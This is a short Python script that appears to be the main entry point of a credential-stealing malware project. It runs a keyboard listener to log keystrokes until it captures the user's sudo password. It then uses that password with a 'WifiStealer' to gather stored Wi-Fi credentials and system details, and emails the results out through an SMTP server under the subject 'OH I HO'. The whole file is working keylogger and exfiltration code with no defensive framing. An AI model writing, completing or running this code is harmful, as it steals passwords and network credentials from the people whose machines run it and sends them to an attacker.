from time import sleep

from pynput.keyboard import Listener

from key_logger import KeyLogger
from stealer import WifiStealer
from email_config import MailConfig


def create_html(data: dict) -> str:
    created_html = ''
    for k, v in data.items():
        created_html += f'<b>{k}:</b> {v}<br>'
    return created_html


if __name__ == '__main__':
    logger = KeyLogger()
    conf = MailConfig()
    msg = conf.create_email_message()
    msg['Subject'] = 'OH I HO'
    listener = Listener(on_press=logger.on_press)
    listener.start()
    while True:
        sleep(0.5)
        sudo_password = logger.get_password()
        if sudo_password:
            wifi_stealer = WifiStealer(sudo_password=sudo_password)
            result = wifi_stealer.collect_all_info()
            break
    listener.stop()
    html = create_html(result)
    msg.add_alternative(html, subtype='html')
    conf.connect_to_smtp_server_and_send_msg(msg)
